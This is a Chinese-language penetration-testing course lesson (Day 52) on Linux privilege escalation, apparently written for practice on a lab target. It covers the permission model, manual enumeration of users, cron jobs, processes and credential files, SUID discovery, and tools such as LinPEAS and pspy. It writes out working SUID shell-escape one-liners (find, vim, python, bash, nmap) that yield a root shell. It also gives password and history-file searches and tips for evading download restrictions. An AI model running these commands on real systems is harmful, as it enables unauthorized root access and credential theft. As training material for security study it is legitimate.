---
title: Day052：Linux 提权基础 - 权限模型与信息收集
tags:
  - 网络安全
  - Linux提权
  - 信息收集
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d052
date: 2026-03-15
updated: 2026-01-28
---

# Day052：Linux 提权基础 - 权限模型与信息收集

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 9：系统提权入门 |
| **今日主题** | Linux 权限模型与提权信息收集 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你通过 Web 漏洞拿到了一个 Web Shell，但只是 `www-data` 用户。想读 `/etc/shadow`？权限不够。想装工具？权限不够。想做任何有意义的事？权限不够。
>
> **问题**：如何从一个低权限 shell 提升到 root？
>
> **今天的任务**：学习 Linux 提权的第一步——理解权限模型，收集提权所需的关键信息。

---

## 今日目标

- [ ] 理解 Linux 权限模型
- [ ] 掌握提权信息收集技术
- [ ] 学会使用自动化枚举工具
- [ ] 识别潜在的提权向量

**闯关条件**：在靶机上完成信息收集，找出至少 3 个潜在提权向量。

---

## 实战任务（先动手！）

### 任务 1：理解 Linux 权限模型（25 分钟）

**用户与组**：
```bash
# 查看当前用户
whoami
id

# 输出示例
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 解读
# uid=33：用户 ID
# gid=33：主组 ID
# groups：所属的所有组
```

**权限位解析**：
```bash
# 文件权限
ls -la /etc/passwd

-rw-r--r-- 1 root root 2847 Mar 15 10:00 /etc/passwd

# 解读
# -rw-r--r--
# │├──┼──┼──
# │ │  │  └── 其他用户：r-- (读)
# │ │  └───── 所属组：r-- (读)
# │ └──────── 所有者：rw- (读写)
# └────────── 类型：- (普通文件)
```

**特殊权限位**：
```bash
# SUID (4)：以文件所有者身份运行
# SGID (2)：以文件所属组身份运行
# Sticky (1)：只有所有者能删除

# SUID 示例
ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 Mar 15 10:00 /usr/bin/passwd
#   ^
#   s = SUID 位
```

**为什么 SUID 危险？**
```
passwd 命令需要修改 /etc/shadow
普通用户没有权限修改 /etc/shadow
但 passwd 设置了 SUID，运行时以 root 身份执行
所以普通用户可以修改自己的密码

如果某个有漏洞的程序设置了 SUID...
→ 以 root 身份运行漏洞程序
→ 获得 root 权限！
```

**记录**：
```
当前用户权限：________________
```

---

### 任务 2：手动信息收集（45 分钟）

**系统信息**：
```bash
# 系统版本
uname -a
cat /etc/*release

# 内核版本（用于查找内核漏洞）
uname -r

# CPU 架构
uname -m

# 示例输出
Linux victim 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux
```

**用户信息**：
```bash
# 所有用户
cat /etc/passwd

# 可登录用户
cat /etc/passwd | grep -v "nologin\|false"

# 当前登录用户
w
who

# 最近登录历史
last

# sudo 权限
sudo -l
```

**网络信息**：
```bash
# 网络接口
ip a
ifconfig

# 监听端口
ss -tulnp
netstat -tulnp

# 路由表
ip route
route -n

# ARP 缓存（发现内网主机）
arp -a
```

**进程与服务**：
```bash
# 运行中的进程
ps aux

# 以 root 运行的进程
ps aux | grep "^root"

# 系统服务
systemctl list-units --type=service
```

**计划任务**：
```bash
# 系统 cron
cat /etc/crontab
ls -la /etc/cron.*

# 用户 cron
crontab -l
ls -la /var/spool/cron/crontabs/
```

**敏感文件**：
```bash
# 查找密码文件
find / -name "*.password" -o -name "*.passwd" -o -name "*credentials*" 2>/dev/null

# 查找配置文件
find / -name "*.conf" -o -name "*.config" 2>/dev/null | head -20

# 查找历史文件
cat ~/.bash_history
cat ~/.mysql_history
```

**记录**：
```
内核版本：________________
可疑进程：________________
敏感文件：________________
```

---

### 任务 3：SUID/SGID 枚举（40 分钟）

**查找 SUID 文件**：
```bash
# 查找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 查找所有 SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 同时查找
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null
```

**分析 SUID 文件**：
```bash
# 常见 SUID 文件（正常）
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/ping

# 可疑 SUID 文件（可能提权）
/usr/bin/find
/usr/bin/vim
/usr/bin/python
/usr/bin/bash
/usr/bin/nmap
```

**GTFOBins 查询**：
```
https://gtfobins.github.io/

这是 SUID 提权的宝典！
每个程序都有对应的提权方法
```

**SUID find 提权示例**：
```bash
# 如果 find 有 SUID
find . -exec /bin/sh -p \; -quit

# -p 保留 effective UID
# 直接获得 root shell
```

**SUID vim 提权示例**：
```bash
# 如果 vim 有 SUID
vim -c ':!/bin/sh'

# 或
vim -c ':py import os; os.execl("/bin/sh", "sh", "-p")'
```

**SUID python 提权示例**：
```bash
# 如果 python 有 SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**记录**：
```
发现的 SUID 文件：________________
可利用的程序：________________
```

---

### 任务 4：自动化枚举工具（40 分钟）

**LinPEAS - 最强枚举工具**：
```bash
# 下载
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# 或 curl
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# 运行
chmod +x linpeas.sh
./linpeas.sh

# 保存输出
./linpeas.sh | tee linpeas_output.txt
```

**LinPEAS 输出解读**：
```
颜色含义：
🔴 红色/黄色：高风险，优先检查
🟢 绿色：有价值的信息
⚪ 白色：一般信息

重点关注：
- CVEs Check（已知漏洞）
- SUID 文件
- Capabilities
- 可写文件/目录
- 密码/凭据
```

**LinEnum**：
```bash
# 下载
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# 运行
chmod +x LinEnum.sh
./LinEnum.sh -t

# -t 进行彻底检查
```

**linux-exploit-suggester**：
```bash
# 下载
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# 运行
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# 输出内核漏洞利用建议
```

**pspy - 进程监控**：
```bash
# 下载
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

# 运行
chmod +x pspy64
./pspy64

# 监控后台进程（包括 cron 任务）
# 不需要 root 权限
```

**记录**：
```
使用的工具：________________
发现的高风险项：________________
```

---

### 任务 5：整理提权向量（20 分钟）

**提权向量清单模板**：
```
系统信息：
- 内核版本：________________
- 发行版：________________
- 架构：________________

潜在向量：
1. SUID/SGID：
   - ________________
   - ________________

2. 内核漏洞：
   - ________________

3. sudo 配置：
   - ________________

4. Cron 任务：
   - ________________

5. 可写敏感文件：
   - ________________

6. 密码/凭据：
   - ________________

7. 其他：
   - ________________

优先级排序：
1. ________________（最可能成功）
2. ________________
3. ________________
```

**记录**：
```
发现的提权向量数量：________________
最有希望的向量：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解权限模型 | 15 分 |
| 完成手动信息收集 | 25 分 |
| 完成 SUID 枚举 | 25 分 |
| 使用自动化工具 | 20 分 |
| 整理提权向量清单 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### Linux 权限模型深入

```
传统 Unix 权限：
- 基于用户/组的 DAC（自主访问控制）
- rwx 权限位
- SUID/SGID/Sticky 特殊位

现代扩展：
- Capabilities（能力）：细粒度权限
- SELinux/AppArmor：MAC（强制访问控制）
- ACL：更灵活的访问控制列表
```

### 提权的本质

```
提权 = 获取更高权限
       ↓
1. 利用 SUID 程序的漏洞
2. 利用内核漏洞
3. 利用配置错误
4. 利用密码/凭据泄露
5. 利用服务漏洞
       ↓
最终目标：root 权限
```

### 信息收集的重要性

```
信息收集是提权的 80%

原因：
1. 每个系统都不一样
2. 可利用的点需要发现
3. 漏洞利用需要精确匹配
4. 盲目尝试浪费时间且可能触发告警

黄金法则：
枚举、枚举、再枚举！
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| find 权限不足 | 大量 "Permission denied" | 使用 2>/dev/null 重定向错误 |
| 工具无法下载 | wget/curl 被禁 | 使用 base64 编码传输 |
| Shell 不完整 | 命令无法执行 | 升级到完整 TTY |
| 枚举速度慢 | 系统文件太多 | 限制搜索范围，优先检查高价值目标 |

---

## 知识卡片速查

### 快速枚举命令

```bash
# 一行信息收集
id; uname -a; cat /etc/*release; sudo -l

# SUID 快速查找
find / -perm -4000 2>/dev/null

# 可写目录
find / -writable -type d 2>/dev/null

# 全局可写文件
find / -perm -o=w -type f 2>/dev/null

# 密码搜索
grep -r "password" /home 2>/dev/null
```

### 关键文件位置

```
/etc/passwd - 用户信息
/etc/shadow - 密码哈希（需要 root）
/etc/sudoers - sudo 配置
/etc/crontab - 系统计划任务
~/.ssh/ - SSH 密钥
~/.bash_history - 命令历史
```

### 常见 SUID 利用

```
find     : find . -exec /bin/sh -p \;
vim      : vim -c ':!/bin/sh'
python   : python -c 'import os; os.execl("/bin/sh","sh","-p")'
bash     : bash -p
nmap     : nmap --interactive; !sh
```

---

## 常见问题

**Q1：为什么要收集这么多信息？**

A1：
- 每个系统配置不同
- 提权方法需要对症下药
- 信息越多，成功率越高
- 避免盲目尝试触发告警

**Q2：LinPEAS 安全吗？**

A2：
- LinPEAS 只做读取操作
- 不会修改系统
- 但可能被检测为恶意活动
- 在真实环境谨慎使用

**Q3：找不到任何可利用的点怎么办？**

A3：
1. 检查是否遗漏（重新枚举）
2. 查看内核漏洞
3. 监控进程（pspy）
4. 社工获取密码
5. 横向移动到其他主机

---

## 明日预告

**Day 053：Linux 提权 - SUID/SGID 与 Capabilities 利用**

明天你将：
- 深入学习 SUID/SGID 利用技术
- 了解 Linux Capabilities 提权
- 完成多种 SUID 提权实战

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 使用的枚举工具 | |
| 发现的提权向量 | |
| 今日收获 | |

---

> **导师点评**：
>
> 欢迎来到提权的世界！
>
> 拿到 Web Shell 只是开始。在真实渗透中，你拿到的通常是一个权限很低的 shell，什么都做不了。
>
> 提权就像是在一个陌生的房子里找钥匙——你首先要做的是搜遍每个角落。今天学的信息收集就是"搜房子"的过程。
>
> **记住：信息收集做得越彻底，提权成功率越高。没有捷径，只有枚举、枚举、再枚举**。

```bash
echo "Day 052 Complete! 提权之路开始！"
```
